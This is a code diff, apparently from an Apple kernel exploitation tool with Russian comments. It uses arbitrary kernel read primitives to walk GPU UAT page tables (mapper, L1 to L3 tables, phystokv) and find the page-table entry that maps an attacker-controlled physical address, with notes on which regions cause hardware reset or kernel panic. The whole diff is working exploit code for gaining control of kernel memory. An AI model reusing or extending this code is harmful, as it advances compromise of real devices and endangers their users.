@@ -5422,40 +5422,32 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
         kpNote(r, [NSString stringWithFormat:@"  gart+0x278=%#llx gart+0x280=%#llx gpuVA=%#llx",
                    kp_rc_kread64(gart + 0x278), kp_rc_kread64(gart + 0x280), gpuVA]);
         if (kpLooksLikeKernelPointer(uat)) {
-            uint64_t visited[96]; int nv = 0;
-            uint64_t queue[96]; int nq = 0;
-            queue[nq++] = uat;
-            for (int depth = 0; depth < 3 && nq; depth++) {
-                int lvl = nq; nq = 0;
-                for (int q = 0; q < lvl; q++) {
-                    uint64_t obj = queue[q];
-                    BOOL dup = NO;
-                    for (int v = 0; v < nv; v++) if (visited[v] == obj) { dup = YES; break; }
-                    if (dup) continue;
-                    visited[nv++] = obj;
-                    uint32_t scanSize = (depth == 0) ? 0x578 : 0x400;
-                    NSMutableString *dl = [NSMutableString stringWithFormat:@"  L%d obj %#llx:", depth, obj];
-                    int ptrs = 0;
-                    for (uint32_t o = 0; o < scanSize; o += 8) {
-                        uint64_t e = kp_rc_kread64(obj + o);
-                        BOOL hit = pa0 && ((e & 0x0003FFFFFFFFC000ULL) == (pa0 & 0x0003FFFFFFFFC000ULL));
-                        if (hit) [dl appendFormat:@" +%#x=%#llx←PTE!", o, e];
-                        uint64_t eu = kp_untag_ptr(e);
-                        // heap-полосы df..e5 читаются безопасно; 0xffffffea/ec =
-                        // GPU MMIO-апертура (чтение = hw reset), EL2 — паника
-                        uint64_t band = (eu >> 32) & 0xff;
-                        BOOL heapBand = band >= 0xdf && band <= 0xe8;
-                        extern uint64_t kvtophys(uint64_t);
-                        uint64_t pa2 = (heapBand && kpLooksLikeKernelPointer(eu)) ? kvtophys(eu) : 0;
-                        BOOL managed = pa2 && kpPAIsManaged(pa2);
-                        if (kpLooksLikeKernelPointer(eu) && !kpVAIsEL2Domain(eu) && managed && nq < 90 && ptrs < 40) {
-                            queue[nq++] = eu;
-                            if (depth == 0) [dl appendFormat:@" +%#x→%#llx", o, eu];
-                            ptrs++;
-                        }
-                    }
-                    kpNote(r, dl);
-                }
+            // Прямой walk (6 чтений): IOUAT+0x20 → mapper; mapper+0x30 → L1arr;
+            // entries промежутков = ФИЗАДРЕСА таблиц (не VA!) → phystokv.
+            uint64_t mapper = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
+            kpNote(r, [NSString stringWithFormat:@"  mapper=%#llx ops=%#llx (ждём slid 0x7ac5820)", mapper,
+                       mapper ? kp_untag_ptr(kp_rc_kread64(mapper)) : 0]);
+            if (!kpLooksLikeKernelPointer(mapper)) { return r; }
+            uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
+            kpNote(r, [NSString stringWithFormat:@"  L1arr=%#llx", L1arr]);
+            uint32_t pc = (uint32_t)((gpuVA >> 36) & 0x7FF);
+            uint32_t pd = (uint32_t)((gpuVA >> 25) & 0x7FF);
+            uint32_t pt = (uint32_t)((gpuVA >> 14) & 0x7FF);
+            uint64_t e1 = kp_rc_kread64(L1arr + (uint64_t)pc * 8);
+            uint64_t L2pa = e1 & 0xFFFFFFFFF000ULL;
+            uint64_t L2 = gPrimitives.phystokv ? gPrimitives.phystokv(L2pa) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  pc=%u e1=%#llx → L2 pa=%#llx kv=%#llx", pc, e1, L2pa, L2]);
+            uint64_t e2 = L2 ? kp_rc_kread64(L2 + (uint64_t)pd * 8) : 0;
+            uint64_t L3pa = e2 & 0xFFFFFFFFF000ULL;
+            uint64_t L3 = (L3pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L3pa) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  pd=%u e2=%#llx → L3 pa=%#llx kv=%#llx", pd, e2, L3pa, L3]);
+            uint64_t pte = L3 ? kp_rc_kread64(L3 + (uint64_t)pt * 8) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  pt=%u → PTE slot @ %#llx = %#llx (наш PA=%#llx)", pt, L3 ? L3 + pt * 8 : 0, pte, pa0]);
+            // декод phys-окна из живого PTE
+            if (pte) {
+                for (uint32_t sh = 0; sh <= 14; sh++)
+                    if ((pte >> sh) == pa0 || ((pte >> sh) & 0x3FFFFFFFFFFFULL) == (pa0 & 0x3FFFFFFFFFFFULL))
+                        kpNote(r, [NSString stringWithFormat:@"  phys-окно: PA = PTE >> %u", sh]);
             }
         }
     }
